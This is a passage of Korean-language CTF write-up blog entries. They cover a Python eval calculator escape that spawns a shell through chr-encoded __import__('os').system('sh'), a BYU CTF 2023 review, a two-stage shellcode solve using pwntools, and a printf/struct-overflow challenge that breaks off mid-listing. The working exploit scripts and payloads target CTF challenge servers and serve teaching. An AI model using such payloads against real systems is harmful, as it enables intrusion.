class="string">&quot;=&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(items) != <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Invalid syntax!&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        varname, expression = items</span><br><span class="line">        varname = varname.strip()</span><br><span class="line">        expression = expression.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(varname) != <span class="number">1</span> <span class="keyword">or</span> <span class="keyword">not</span> varname.islower():</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Invalid variable name!&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_expression(expression):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Invalid character in expression!&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        result = <span class="built_in">eval</span>(expression, <span class="built_in">vars</span>, &#123;<span class="string">&#x27;sin&#x27;</span>: sin, <span class="string">&#x27;cos&#x27;</span>: cos, <span class="string">&#x27;sqrt&#x27;</span>: sqrt, <span class="string">&#x27;exp&#x27;</span>: exp, <span class="string">&#x27;log&#x27;</span>: log, <span class="string">&#x27;pi&#x27;</span>: pi&#125;)</span><br><span class="line">        <span class="built_in">vars</span>[varname] = result</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&gt;&gt;&gt; &#123;&#125; = &#123;&#125;&quot;</span>.<span class="built_in">format</span>(varname, result))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span>(USAGE)</span><br><span class="line">    loop()</span><br></pre></td></tr></table></figure><p><code>result = eval(expression, vars, &#123;&#39;sin&#39;: sin, &#39;cos&#39;: cos, &#39;sqrt&#39;: sqrt, &#39;exp&#39;: exp, &#39;log&#39;: log, &#39;pi&#39;: pi&#125;)</code> ÏóêÏÑú <code>eval</code> Ìï®ÏàòÎ•º ÏÇ¨Ïö©Ìï¥ÏÑú Ï∑®ÏïΩÏ†êÏù¥ Î∞úÏÉùÌï† Ïàò ÏûàÎã§.</p><p><code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code> ÏùÑ Ïã§ÌñâÏãúÌÇ§Í≥† Ïã∂Îã§. Ïù¥Î•º ÏúÑÌï¥ <code>eval(__import__(&#39;os&#39;).system(&#39;sh&#39;))</code>ÏùÑ ÏÑúÎ≤ÑÏóêÏÑú Ïã§ÌñâÏãúÌÇ§Í≥† Ïã∂ÏóàÎã§. Ïù¥Îïå Î¨∏Ï†úÎäî <code>.+*-/()</code>Îßå ÌóàÏö©Ìï¥ÏÑú <code>&#39;</code>ÏùÑ ÏÇ¨Ïö©Ìï† ÏàòÍ∞Ä ÏóÜÎã§. Ïù¥Î•º ÏúÑÌï¥ <code>eval</code>Í≥º <code>chr</code>ÏùÑ ÏÇ¨Ïö©ÌñàÍ≥† Ïù¥Í±∏ Î°úÏª¨Ïù¥ ÏïÑÎãå ÏÑúÎ≤ÑÏóêÏÑú Ïã§ÌñâÏãúÌÇ§ÎèÑÎ°ù ÎÖ∏Î†•ÌñàÎã§. payloadÎ•º Î°úÏª¨ÏóêÏÑú Ïã§ÌñâÏãúÌÇ¨ Îïå ÏóêÎü¨ ÏóÜÏù¥ ÏõêÌïòÎäî ÌñâÏúÑÎ•º Ïã§ÌñâÏãúÌÇ¨ Ïàò ÏûàÏñ¥Ïïº ÌïúÎã§. Ïù¥Í≤å Í∑∏ÎåÄÎ°ú ÏÑúÎ≤ÑÏóêÏÑú Ïã§ÌñâÎêúÎã§Í≥† ÏÉùÍ∞ÅÌïòÎ©¥ ÎêúÎã§.</p><p><code>python eval</code> Ï∑®ÏïΩÏ†êÏóê ÎåÄÌïú ÏûêÏÑ∏Ìïú ÎÇ¥Ïö©ÏùÄ ÏïÑÎûò Î∏îÎ°úÍ∑∏Î•º Ï∞∏Í≥†ÌñàÎã§.</p><ul><li><a href="https://passwd.tistory.com/entry/eval-%EB%AC%B8%EC%9E%90%EC%97%B4-%EC%8B%9D-%EC%8B%A4%ED%96%89">https://passwd.tistory.com/entry/eval-%EB%AC%B8%EC%9E%90%EC%97%B4-%EC%8B%9D-%EC%8B%A4%ED%96%89</a></li></ul><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&#x27;python&#x27;, &#x27;./calc.py&#x27;])</span></span><br><span class="line">p = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="number">19815</span>)</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;__import__(\&#x27;os\&#x27;).system(\&#x27;sh\&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a = &#x27;</span></span><br><span class="line">payload += <span class="string">&#x27;eval(&#x27;</span></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> cmd:</span><br><span class="line">    payload += <span class="string">&#x27;chr(&#x27;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(c)) + <span class="string">&#x27;)+&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = payload[:-<span class="number">1</span>]</span><br><span class="line">payload += <span class="string">&#x27;)&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;$&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TBTL&#123;4Nd_54nd80x1n6_15_3v3n_h4rd3r&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> TBCL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> eval </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BYU CTF 2023 review</title>
      <link href="/230523-byuctf2023-0review/"/>
      <url>/230523-byuctf2023-0review/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1935">https://ctftime.org/event/1935</a></li><li><a href="https://github.com/BYU-CSA/BYUCTF-2023/tree/main">https://github.com/BYU-CSA/BYUCTF-2023/tree/main</a></li></ul><p>Ï†ÄÎ≤à Ï£ºÎßêÏóê Ïî®ÌÖùÏù¥ Ï∞∏ ÎßéÏù¥ Ïó¥Î†∏Îã§. ÏÇ¨Ïã§ ÏöîÏ¶ò Í≤åÏûÑÏóê Îπ†Ï†∏ÏûàÏñ¥ÏÑú Í≤åÏûÑ ÎçòÏ†Ñ Ïû°ÌûàÎäî ÎèôÏïà Îã§Î•∏ Ïî®ÌÖù Î¨∏Ï†úÎ•º ÌãàÌãàÌûà ÌíÄÏñ¥Î≥¥Í≥† Ïù¥ Ïî®ÌÖùÏùÄ Ï£ºÎßêÏóê Ïî®ÌÖù ÎÅùÎÇòÍ≥† ÏõîÏöîÏùºÏóê Îã§ ÌíÄÏñ¥Î¥§Îã§. ÏÜîÎ∏å ÏàòÎèÑ ÌÉÄ Ïî®ÌÖùÎ≥¥Îã§ ÎÜíÏùÄ Ìé∏Ïù¥Í∏∏Îûò(hardÎùºÍ≥† ÌëúÍ∏∞Îêú ÏÜîÎ∏å Ïàò Í∞ÄÏû• Ï†ÅÏùÄ Ìè¨ÎÑàÎ∏îÏù¥ 45ÏÜîÎ∏åÏòÄÏùå) Î™ª ÌíÄÎ©¥ Ïñ¥Îñ°ÌïòÎÇò Í∏¥Ïû•ÌïòÎ©¥ÏÑú ÌíÄÏóàÎã§. Îã§ÌñâÌûà Îã§ ÌíÄÏñ¥ÏÑú Í∏∞Î∂ÑÏù¥ Ï¢ãÏïòÎã§. </p><p>Í∑∏Îü¨ÎÇò Í≥µÏãù ÍπÉÌóàÎ∏åÏóêÎäî Î∞îÏù¥ÎÑàÎ¶¨Í∞Ä ÌïòÎÇò Îçî ÏûàÏóàÍ≥†, Ìïú Î∞îÏù¥ÎÑàÎ¶¨Ïóê 3Í∞úÏùò ÌîåÎûòÍ∑∏Í∞Ä Ïà®Í≤®Ï†∏ ÏûàÏóàÎã§.(Í≥µÏãù ÍπÉÌóàÎ∏åÏóê ÏÑ∏ Î¨∏Ï†úÍ∞Ä Îçî ÏûàÏóàÎã§.) ÌïòÎÇòÎäî Ï∞æÏïòÍ≥†, Ï∑®ÏïΩÏ†êÎèÑ Ï∞æÏïòÏúºÎÇò Ïä§ÌÉùÏùÑ Îã§ Îí§Ï†∏ÏïºÌïòÎäî‚Ä¶ Î∏åÌè¨Î•º Ìï¥ÏïºÌï† Í≤É Í∞ôÏïÑÏÑú ÏùºÎã® Îã§Î•∏ Ïö∞ÏÑ†ÏàúÏúÑÍ∞Ä ÎÜíÏùÄ ÏùºÏùÑ ÌïòÎü¨ Í∞îÍ≥†.. ÏßÄÍ∏àÏùÄ ÌõÑÍ∏∞ÏôÄ Î°∏ÏóÖÎ∂ÄÌÑ∞ Ïì¥Îã§. „Ñ±-</p><ul><li><a href="https://jiravvit.github.io/230523-byuctf2023-2038/">https://jiravvit.github.io/230523-byuctf2023-2038/</a></li><li><a href="https://jiravvit.github.io/230523-byuctf2023-vfs1/">https://jiravvit.github.io/230523-byuctf2023-vfs1/</a></li><li><a href="https://jiravvit.github.io/230523-byuctf2023-shellcode/">https://jiravvit.github.io/230523-byuctf2023-shellcode/</a></li><li><a href="https://jiravvit.github.io/230523-byuctf2023-frorg/">https://jiravvit.github.io/230523-byuctf2023-frorg/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> BYU </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BYU CTF 2023 - Shellcode (shellcode)</title>
      <link href="/230523-byuctf2023-shellcode/"/>
      <url>/230523-byuctf2023-shellcode/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1935">https://ctftime.org/event/1935</a></li></ul><blockquote><p>You‚Äôll have to make your own shellcode for this one!<br>nc byuctf.xyz 40017<br>tag: medium </p></blockquote><ul><li>[51 solves &#x2F; 452 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ÏÜåÏä§ ÏΩîÎìúÍ∞Ä Ï£ºÏñ¥Ï†∏ ÏûàÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAP_ANONYMOUS 0x20</span></span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) <span class="type">void</span> <span class="title function_">flush_buf</span><span class="params">()</span> &#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// create memory for shellcode to reside in</span></span><br><span class="line">    mmap((<span class="type">char</span> *)<span class="number">0x777777000</span>, <span class="number">71</span>, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED|MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// set first 51 bytes to 0s</span></span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">char</span> *)<span class="number">0x777777000</span>, <span class="number">0x00</span>, <span class="number">51</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get first 10 bytes of shellcode</span></span><br><span class="line">    <span class="type">char</span> shellcode_one[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter first 10 bytes of shellcode: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, shellcode_one, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">char</span> *)<span class="number">0x777777000</span>, shellcode_one, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get second 10 bytes of shellcode</span></span><br><span class="line">    <span class="type">char</span> shellcode_two[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter second 10 bytes of shellcode: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, shellcode_two, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">char</span> *)<span class="number">0x777777020</span>, shellcode_two, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get third 10 bytes of shellcode</span></span><br><span class="line">    <span class="type">char</span> shellcode_three[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter third 10 bytes of shellcode: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, shellcode_three, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">char</span> *)<span class="number">0x777777040</span>, shellcode_three, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get last 10 bytes of shellcode</span></span><br><span class="line">    <span class="type">char</span> shellcode_four[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter last 10 bytes of shellcode: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, shellcode_four, <span class="number">10</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="type">char</span> *)<span class="number">0x777777060</span>, shellcode_four, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// call shellcode</span></span><br><span class="line">    ((<span class="type">void</span> (*)())<span class="number">0x777777000</span>)();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>0x777777000 Ï£ºÏÜåÎ∂ÄÌÑ∞ Ïã§ÌñâÍ∂åÌïúÏùÑ Ï£ºÏóàÎã§. Í∑∏Î¶¨Í≥† 10Î∞îÏù¥Ìä∏Ïî© shellcodeÎ•º ÏûÖÎ†•ÌïúÎã§. Ïù¥Îïå 10Î∞îÏù¥Ìä∏ nullÏù¥ ÏÉùÍ∏¥Îã§. ÎßàÏßÄÎßâÏóî 0x777777000ÏùÑ Ïã§ÌñâÏãúÌÇ®Îã§. Î∞îÎ°ú Îì† ÏÉùÍ∞ÅÏùÄ Ï≤òÏùåÏóê shellcodeÎ•º ÏûÖÎ†•Ìï† Îïå <code>read(0, 0x777777000, size)</code> syscallÏùÑ ÏûÖÎ†•ÌïòÎ©¥ 10Î∞îÏù¥Ìä∏ ÎùÑÏóÑÎùÑÏóÑ ÏûÖÎ†•ÌïòÎäî ÌïúÍ≥ÑÎ•º ÏóÜÏï® Ïàò ÏûàÍ≤†Îã§Í≥† ÏÉùÍ∞ÅÌñàÎã§. Îã® ÎÇ¥Í∞Ä Í∞ÄÏû• Ïã§ÌñâÌïòÍ≥† Ïã∂ÏùÄ syscallÏù¥ 10Î∞îÏù¥Ìä∏ Ïù¥ÎÇ¥Ïó¨Ïïº ÌïúÎã§.</p><p>Îã§ÌñâÌûà ÎßàÏßÄÎßâ call shellcodeÎ•º Ìï† Îïå Î†àÏßÄÏä§ÌÑ∞ ÏÉÅÌô©ÏùÄ ÏïÑÎûòÏôÄ Í∞ôÏïòÍ≥†, <code>mov rsi, rdx</code>ÏôÄ <code>syscall</code>ÏùÑ Ïã§ÌñâÏãúÌÇ¥ÏúºÎ°úÏç® ÎÇ¥ ÏùòÎèÑÎåÄÎ°ú Î¨∏Ï†úÎ•º ÌíÄ Ïàò ÏûàÏóàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$rax   : 0x0  </span><br><span class="line">$rdi   : 0x0   </span><br><span class="line">$rsi   : 0x007fffffffe58e  ‚Üí  0x00000a64646464 (&quot;dddd\n&quot;?)</span><br><span class="line">$rdx   : 0x00000777777000  ‚Üí  0x00000a61616161 (&quot;aaaa\n&quot;?)</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./shellcode&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># $rax   : 0x0  </span></span><br><span class="line"><span class="comment"># $rdi   : 0x0   </span></span><br><span class="line"><span class="comment"># $rsi   : 0x007fffffffe58e  ‚Üí  0x00000a64646464 (&quot;dddd\n&quot;?)</span></span><br><span class="line"><span class="comment"># $rdx   : 0x00000777777000  ‚Üí  0x00000a61616161 (&quot;aaaa\n&quot;?)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4 bytes</span></span><br><span class="line"><span class="comment"># read(0, 0x00000777777000,)</span></span><br><span class="line">shellcode_one = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rsi, rdx</span></span><br><span class="line"><span class="string">syscall</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(asm(shellcode_one)) </span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, asm(shellcode_one)) </span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, p64(<span class="number">0</span>)) </span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, p64(<span class="number">0</span>)) </span><br><span class="line">pause()</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>, p64(<span class="number">0</span>)) </span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.sh()</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">5</span> + asm(shellcode))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> BYU </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BYU CTF 2023 - VFS 1 (printf null)</title>
      <link href="/230523-byuctf2023-vfs1/"/>
      <url>/230523-byuctf2023-vfs1/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1935">https://ctftime.org/event/1935</a></li></ul><blockquote><p>I‚Äôve decided that we don‚Äôt virtualize things enough, so I created a virtual file system that you can run and save your secrets on. This is still in beta-testing, but let me know what you think!<br>nc byuctf.xyz 40008<br>tag: medium </p></blockquote><ul><li>[80 solves &#x2F; 381 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ÏÜåÏä§ ÏΩîÎìúÍ∞Ä Ï£ºÏñ¥Ï†∏ÏÑú Ï§ëÏöîÌïú Î∂ÄÎ∂ÑÎßå Í∞ÄÏ†∏ÏôîÎã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// INITIALIZATIONS</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">filesystem</span> &#123;</span></span><br><span class="line">    <span class="type">char</span> contents[<span class="number">2880</span>];</span><br><span class="line">    <span class="type">char</span> flag[<span class="number">64</span>];</span><br><span class="line">    <span class="type">int</span> current_file;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (buffer) &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(fs.flag, buffer); <span class="comment">// flagÎ•º Î≥µÏÇ¨ </span></span><br><span class="line">    <span class="built_in">free</span>(buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">fs.current_file = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> filename[<span class="number">32</span>];</span><br><span class="line"><span class="type">char</span> contents[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>==<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="type">int</span> choice = menu();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (choice == <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (fs.current_file == <span class="number">10</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Sorry, you can&#x27;t create any more files!&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// create</span></span><br><span class="line">    </span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] What would you like to name your file?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%32s&quot;</span>, filename);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] What would you like to put in your file?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%256s&quot;</span>, contents);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// copy filename</span></span><br><span class="line">        <span class="built_in">memcpy</span>(fs.contents + (fs.current_file*<span class="number">288</span>), filename, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// copy contents</span></span><br><span class="line">        <span class="built_in">memcpy</span>(fs.contents + (fs.current_file*<span class="number">288</span>) + <span class="number">32</span>, contents, <span class="number">256</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] File created! (#%d)\n\n&quot;</span>, fs.current_file);</span><br><span class="line">        fs.current_file++;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="number">4</span>) &#123;</span><br><span class="line">        <span class="comment">// read</span></span><br><span class="line">        <span class="type">int</span> file_to_read;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[+] Which file # would you like to read?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;file_to_read);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((file_to_read &gt;= fs.current_file) || (file_to_read &lt; <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;[-] Invalid file number&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Filename: %s&quot;</span>, fs.contents + (file_to_read*<span class="number">288</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] Contents: %s&quot;</span>, fs.contents + (file_to_read*<span class="number">288</span>) + <span class="number">32</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>filesystem structÎ•º Î≥¥Î©¥ ÏûÖÎ†• Îí§Ïóê flagÍ∞Ä Ï†ÄÏû•ÎêòÏñ¥ ÏûàÎã§. 1Î≤à Í∏∞Îä•ÏúºÎ°ú <code>fs.contents</code>Î•º Ï±ÑÏö∏ Ïàò ÏûàÎã§. 4Î≤à Í∏∞Îä•ÏùÄ ÎÇòÏùò ÏûÖÎ†•ÏùÑ Ï∂úÎ†•Ìï¥Ï§ÄÎã§. ÎßåÏïΩ <code>fs.contents</code>Î•º ÍΩâ Ï±ÑÏö∞Î©¥ Î∞îÎ°ú Îí§Ïóê ÏûàÎäî <code>fs.flag</code>Í∞Ä Ï∂úÎ†•Îê† Í≤ÉÏù¥Îã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 